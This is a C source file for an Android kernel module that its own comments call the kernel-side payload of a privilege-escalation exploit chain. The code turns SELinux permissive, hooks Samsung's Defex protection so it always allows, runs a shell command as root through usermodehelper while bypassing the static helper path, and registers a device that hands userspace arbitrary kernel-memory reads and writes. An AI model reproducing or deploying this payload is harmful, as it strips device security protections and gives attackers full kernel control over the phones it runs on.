// SPDX-License-Identifier: GPL-2.0
/*
 * GhostLock minimal kernel-side payload (CVE-2026-43284 chain, B5-9h-LKM).
 *
 * Loaded once through insmod from the init / vendor_modprobe domain by the
 * page-cache chain. It runs in kernel context, performs exactly the four steps
 * the chain needs, then returns an error so the module is not kept resident.
 *
 *   1. resolve arbitrary kernel symbols through kallsyms_lookup_name (obtained
 *      with the classic kprobe trick, because the symbol is not exported);
 *   2. optionally set SELinux permissive (module parameter "permissive",
 *      default 1) - the init-domain work that follows needs it;
 *   3. run one userspace command through call_usermodehelper (module parameter
 *      "cmd", default the inert /system/bin/true) after forcing
 *      subprocess_info->path to /system/bin/sh, which defeats
 *      CONFIG_STATIC_USERMODEHELPER_PATH="";
 *   4. optionally hook the Samsung Defex entry points (module parameter
 *      "defex", default 0). On non-Samsung kernels those symbols do not exist
 *      and the failure is recorded but not fatal.
 *
 * Delta batch: the module can additionally expose a versioned request channel
 * (misc device /dev/glk + ioctl) that lets userspace forward kernel-memory
 * reads/writes through it. The four steps run first, then /dev/glk is
 * registered and module_init blocks until UNLOAD (or a bounded timeout), then
 * returns -E2BIG. Self-unload is therefore still the same deliberate-failure
 * path, and the device disappears with the module. See
 * src/core/plugin/kernel_channel.hpp and docs/analysis/contract-design.md
 * sections 3.12/3.12.1/3.12.2/3.12.3.
 *
 * The channel defaults to resident (module parameter "resident" = 1) because
 * the shellcode slot table is fixed at seven entries (exe_path 19B / ko_target
 * 64B) and cannot carry an extra "resident=1" argv; passing resident=0 still
 * restores the legacy "run and immediately self-unload" behaviour verbatim.
 *
 * Differences from the upstream DFRoot LKM: the Samsung-specific behaviour is
 * opt-in, the command is a bounded module parameter instead of a hard-coded
 * string, the default command is inert, every step is logged for on-device
 * verification, and a missing mandatory symbol aborts before any state change.
 *
 * Returning -E2BIG is deliberate: a failing module_init makes the kernel unload
 * the module, so nothing stays resident.
 */
#include <linux/delay.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/kprobes.h>
#include <linux/miscdevice.h>
#include <linux/mm.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/ptrace.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/umh.h>
#include <linux/wait.h>

#define GHOSTLOCK_CMD_MAX 512

/* Mirror of src/core/contract/abi/glk_contract_abi.h (the native side is the
 * source of truth; the out-of-tree module cannot include the userspace tree).
 * Keep the op values, request layout and ioctl number in lockstep. */
#define GLK_LKM_ABI_VERSION 1u
#define GLK_LKM_MAX_XFER 4096u
#define GLK_LKM_IOCTL 0x6747u
/* Leak watchdog for a resident channel whose fd is never closed. Residency is
 * bound to the opener's SESSION, not to a timer: the window ends as soon as the
 * client fd is closed -- explicit close, process exit, or a crash that makes the
 * kernel close it. This bound only covers the pathological case of a leaked fd
 * that is never released, so it is deliberately far above any real window (a
 * real window is tens of synchronous ioctls, i.e. sub-second). */
#define GLK_LKM_WATCHDOG_MS 60000u

enum glk_lkm_op {
    GLK_LKM_PING = 0,
    GLK_LKM_READ = 1,
    GLK_LKM_WRITE = 2,
    GLK_LKM_WRITE_ZERO = 3,
    GLK_LKM_DIRECT_MAP = 4,
    GLK_LKM_QUERY = 5,
    GLK_LKM_LOG = 6,
    GLK_LKM_UNLOAD = 7
};

struct glk_lkm_req {
    u32 abi_version;
    u32 op;
    u64 addr;
    u64 value;
    u32 len;
    u32 status;
};

/* Default command: the chain prepends no insmod argv (the libcxx hook has six
 * value slots and none carries extra arguments), so the module must know what to
 * run by itself. The path is written by the host tooling before the run; it is
 * still overridable with the cmd= module parameter for manual tests. */
static char *cmd = "/data/local/tmp/.ghostlock_lkm_cmd.sh";
module_param(cmd, charp, 0400);
MODULE_PARM_DESC(cmd, "Command string passed to /system/bin/sh -c");

static int permissive = 1;
module_param(permissive, int, 0400);
MODULE_PARM_DESC(permissive, "Set SELinux permissive before running the command");

static int defex = 0;
module_param(defex, int, 0400);
MODULE_PARM_DESC(defex, "Hook Samsung Defex entry points when present");

/* Finish like the 43499 root script: once the command (KernelSU late-load) has
 * completed, put SELinux back to enforcing. Only acts when this module was the
 * one that turned it permissive, so permissive=0 stays a pure no-op. */
static int restore_enforce = 1;
module_param(restore_enforce, int, 0400);
MODULE_PARM_DESC(restore_enforce, "Restore SELinux enforcing after the command");

/* Delta batch: expose the versioned /dev/glk channel and keep the module
 * resident until UNLOAD. Default 1 because the insmod shellcode cannot append
 * a "resident=1" argv (the value-slot table is fixed); an explicit resident=0
 * restores the legacy "run and immediately self-unload" behaviour exactly. */
static int resident = 1;
module_param(resident, int, 0400);
MODULE_PARM_DESC(resident, "Expose /dev/glk and stay resident until UNLOAD");

typedef unsigned long (*kallsyms_lookup_name_t)(const char *);
typedef void *(*umh_setup_t)(const char *, char **, char **, gfp_t,
                             int (*)(struct subprocess_info *, struct cred *),
                             void (*)(struct subprocess_info *), void *);
typedef int (*umh_exec_t)(struct subprocess_info *, int);

/* Single-opener channel state. The module is unloaded when module_init returns,
 * so this state always dies with it. */
static struct {
    atomic_t opened;
    bool unload_requested;
    bool released;
    u32 calls;
    wait_queue_head_t wq;
} g_lkm_channel;

static int defex_pre_handler(struct kprobe *p, struct pt_regs *regs)
{
    (void)p;
    regs->regs[0] = 0;         /* DEFEX_ALLOW */
    regs->pc = regs->regs[30]; /* skip the body, return to the caller */
    return 1;
}

/* True only when [addr, addr+len) lies inside the kernel direct map. This is
 * the same "is this a linear-map address" question the userspace side answers
 * with DIRECT_MAP_BASE/g_direct_map_end; virt_addr_valid() is the in-kernel
 * authority. An out-of-range target is refused with -EFAULT so the ioctl never
 * becomes an arbitrary kernel pointer write hole. */
static bool glk_lkm_addr_ok(u64 addr, u32 len)
{
    u64 last;

    if (len == 0u || len > (u32)GLK_LKM_MAX_XFER)
        return false;
    if (addr > (u64)ULONG_MAX - (u64)len)
        return false;
    last = addr + (u64)len - 1u;
    return virt_addr_valid((unsigned long)addr) &&
           virt_addr_valid((unsigned long)last);
}

/* Image address -> direct-map alias. __pa_symbol is KASLR-aware on arm64 and
 * __va returns the linear-map alias. Inputs outside the linear map and the
 * kernel image are refused (0, which the caller reports as -EFAULT). */
static u64 glk_lkm_direct_map(u64 image)
{
    unsigned long addr = (unsigned long)image;

    if (addr == 0ul)
        return 0ul;
    if (!virt_addr_valid((void *)addr)) {
#ifdef KIMAGE_VADDR
        if (addr < (unsigned long)KIMAGE_VADDR)
            return 0ul;
#else
        return 0ul;
#endif
    }
    return (u64)(unsigned long)__va(__pa_symbol((unsigned long)addr));
}

static long glk_lkm_ioctl(struct file *file, unsigned int cmd_no, unsigned long arg)
{
    struct glk_lkm_req req;
    void __user *uarg = (void __user *)arg;

    (void)file;
    if (cmd_no != (unsigned int)GLK_LKM_IOCTL)
        return -ENOTTY;
    if (copy_from_user(&req, uarg, sizeof(req)) != 0ul)
        return -EFAULT;
    if (req.abi_version != (u32)GLK_LKM_ABI_VERSION)
        return -EPROTO;

    switch (req.op) {
    case GLK_LKM_PING:
        req.status = 0u;
        break;
    case GLK_LKM_READ:
        if (req.value == 0u || !glk_lkm_addr_ok(req.addr, req.len)) {
            req.status = (u32)(-EFAULT);
            break;
        }
        if (copy_to_user((void __user *)(unsigned long)req.value,
                         (void *)(unsigned long)req.addr, req.len) != 0ul)
            req.status = (u32)(-EFAULT);
        else
            req.status = 0u;
        break;
    case GLK_LKM_WRITE:
        if (req.value == 0u || !glk_lkm_addr_ok(req.addr, req.len)) {
            req.status = (u32)(-EFAULT);
            break;
        }
        if (copy_from_user((void *)(unsigned long)req.addr,
                           (const void __user *)(unsigned long)req.value,
                           req.len) != 0ul)
            req.status = (u32)(-EFAULT);
        else
            req.status = 0u;
        break;
    case GLK_LKM_WRITE_ZERO:
        if (!glk_lkm_addr_ok(req.addr, req.len)) {
            req.status = (u32)(-EFAULT);
            break;
        }
        memset((void *)(unsigned long)req.addr, 0, (size_t)req.len);
        req.status = 0u;
        break;
    case GLK_LKM_DIRECT_MAP: {
        u64 mapped = glk_lkm_direct_map(req.value);

        if (mapped == 0u) {
            req.status = (u32)(-EFAULT);
            break;
        }
        req.addr = mapped;
        req.status = 0u;
        break;
    }
    case GLK_LKM_QUERY:
    case GLK_LKM_LOG:
        req.status = (u32)(-EOPNOTSUPP);
        break;
    case GLK_LKM_UNLOAD:
        req.status = 0u;
        g_lkm_channel.unload_requested = true;
        /* Respond before waking module_init: the ioctl then returns while the
         * init thread still owns the module; release() confirms the fd is gone
         * before module_init returns, so teardown cannot race the caller. */
        if (copy_to_user(uarg, &req, sizeof(req)) != 0ul)
            return -EFAULT;
        wake_up_interruptible(&g_lkm_channel.wq);
        return 0;
    default:
        req.status = (u32)(-EINVAL);
        break;
    }

    g_lkm_channel.calls++;
    if (copy_to_user(uarg, &req, sizeof(req)) != 0ul)
        return -EFAULT;
    return 0;
}

static int glk_lkm_open(struct inode *inode, struct file *file)
{
    (void)inode;
    (void)file;
    if (atomic_xchg(&g_lkm_channel.opened, 1) != 0)
        return -EBUSY;
    g_lkm_channel.unload_requested = false;
    g_lkm_channel.released = false;
    return 0;
}

static int glk_lkm_release(struct inode *inode, struct file *file)
{
    (void)inode;
    (void)file;
    atomic_set(&g_lkm_channel.opened, 0);
    g_lkm_channel.released = true;
    /* The session ends here: closing the fd (explicitly, on exit, or via the
     * kernel on a crash) is what terminates the window. module_init is waiting
     * on `released`, so wake it now. */
    wake_up_interruptible(&g_lkm_channel.wq);
    return 0;
}

static const struct file_operations glk_lkm_fops = {
    .owner = THIS_MODULE,
    .open = glk_lkm_open,
    .release = glk_lkm_release,
    .unlocked_ioctl = glk_lkm_ioctl,
#ifdef CONFIG_COMPAT
    .compat_ioctl = glk_lkm_ioctl,
#endif
};

static struct miscdevice glk_lkm_device = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = "glk",
    /* The client is an ordinary process (shell uid on the adb/Shizuku path, an
     * app uid on the App path), so the node must be reachable without root.
     * The channel is deliberately NOT gated (maintainer decision), and its
     * exposure is bounded instead: the node exists only inside the residency
     * window, it is single-open (-EBUSY), and the window is session-bound. */
    .mode = 0666,
    .fops = &glk_lkm_fops,
    .mode = 0600,
};

static int __init ghostlock_init(void)
{
    static const char sh[] = "/system/bin/sh";
    static char *envp[] = { "PATH=/system/bin", NULL };
    static char *argv[] = { (char *)sh, "-c", NULL, NULL };
    struct kprobe kln_kp;
    kallsyms_lookup_name_t get_addr;
    umh_setup_t umh_setup;
    umh_exec_t umh_exec;
    struct subprocess_info *info;
    bool *selinux_state = NULL;
    bool selinux_touched = false;
    bool resident_ok = false;
    int ret;

    if (cmd == NULL || *cmd == '\0' || strlen(cmd) >= GHOSTLOCK_CMD_MAX) {
        pr_err("ghostlock: invalid cmd parameter\n");
        return -EINVAL;
    }
    argv[2] = cmd;

    /* 0. Register the resident channel BEFORE the UMH runs. Android's ueventd
     * creates /dev nodes from its own rules and ignores miscdevice.mode, so the
     * node is always 0600 root; the root UMH script (which runs while SELinux is
     * still permissive) is what relaxes it to 0666 for the session-bound window.
     * Registering here is also safe for resident=0, where the node never exists. */
    if (resident) {
        atomic_set(&g_lkm_channel.opened, 0);
        g_lkm_channel.unload_requested = false;
        g_lkm_channel.released = false;
        g_lkm_channel.calls = 0u;
        init_waitqueue_head(&g_lkm_channel.wq);
        ret = misc_register(&glk_lkm_device);
        if (ret < 0) {
            pr_err("ghostlock: misc_register failed (%d)\n", ret);
        } else {
            resident_ok = true;
            pr_info("ghostlock: /dev/glk registered (pre-UMH)\n");
        }
    }

    /* 1. arbitrary symbol resolution: kallsyms_lookup_name is not exported. */
    memset(&kln_kp, 0, sizeof(kln_kp));
    kln_kp.symbol_name = "kallsyms_lookup_name";
    ret = register_kprobe(&kln_kp);
    if (ret < 0) {
        pr_err("ghostlock: kallsyms_lookup_name unavailable (%d)\n", ret);
        return ret;
    }
    get_addr = (kallsyms_lookup_name_t)kln_kp.addr;
    unregister_kprobe(&kln_kp);

    /* 2. SELinux permissive (opt out with permissive=0). The first byte of
     * selinux_state is the "enforcing" flag; we keep the pointer so the finish
     * step can put the flag back. */
    if (permissive || restore_enforce) {
        selinux_state = (bool *)get_addr("selinux_state");
    }
    if (permissive) {
        if (selinux_state == NULL) {
            pr_err("ghostlock: selinux_state not found; refusing to continue\n");
            return -EINVAL;
        }
        WRITE_ONCE(*selinux_state, false);
        selinux_touched = true;
        pr_info("ghostlock: selinux_state set permissive\n");
    } else {
        pr_info("ghostlock: permissive=0, SELinux untouched\n");
    }

    /* 3. optional Samsung Defex bypass (best effort; absence is not fatal). */
    if (defex) {
        struct kprobe kp;
        memset(&kp, 0, sizeof(kp));
        kp.addr = (kprobe_opcode_t *)get_addr("task_defex_enforce");
        kp.pre_handler = defex_pre_handler;
        if (kp.addr != NULL && register_kprobe(&kp) == 0)
            pr_info("ghostlock: task_defex_enforce hooked\n");
        else
            pr_info("ghostlock: task_defex_enforce not hooked\n");
    }

    /* 4. run the userspace command through UMH. */
    umh_setup = (umh_setup_t)get_addr("call_usermodehelper_setup");
    umh_exec = (umh_exec_t)get_addr("call_usermodehelper_exec");
    if (umh_setup == NULL || umh_exec == NULL) {
        pr_err("ghostlock: usermodehelper symbols missing\n");
        return -EINVAL;
    }
    info = umh_setup(sh, argv, envp, GFP_KERNEL, NULL, NULL, NULL);
    if (info == NULL) {
        pr_err("ghostlock: call_usermodehelper_setup failed\n");
        return -EINVAL;
    }
    /* Defeat CONFIG_STATIC_USERMODEHELPER_PATH="" (which would blank the path). */
    info->path = sh;
    ret = umh_exec(info, UMH_WAIT_PROC);
    pr_info("ghostlock: umh exec returned %d for cmd=%s\n", ret, cmd);

    /* Finish (43499-style): the command has returned, so KernelSU either loaded
     * or failed; put SELinux back to enforcing when this module relaxed it. */
    if (selinux_touched && restore_enforce) {
        WRITE_ONCE(*selinux_state, true);
        pr_info("ghostlock: selinux_state restored to enforcing\n");
    } else if (selinux_touched) {
        pr_info("ghostlock: restore_enforce=0, SELinux left permissive\n");
    }

    if (resident_ok) {
        /* Delta batch: keep the module alive until the client session ends
         * (fd close) or the leak watchdog fires. Residency is bound to the
         * opener's session, never to a timer. */
        const char *unload_reason = "watchdog";
        pr_info("ghostlock: /dev/glk resident (session-bound; fd close ends the window)\n");
        (void)wait_event_interruptible_timeout(
                g_lkm_channel.wq, g_lkm_channel.released,
                msecs_to_jiffies((unsigned long)GLK_LKM_WATCHDOG_MS));
        if (g_lkm_channel.released) {
            unload_reason = g_lkm_channel.unload_requested ? "explicit" : "fd-close";
        }
        misc_deregister(&glk_lkm_device);
        pr_info("ghostlock: resident window closed (calls=%u reason=%s)\n",
                g_lkm_channel.calls, unload_reason);
    }

    /* Deliberate failure so the module is unloaded and never stays resident. */
    return -E2BIG;
}

module_init(ghostlock_init);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("GhostLock minimal kernel-side payload");
MODULE_AUTHOR("GhostLock");
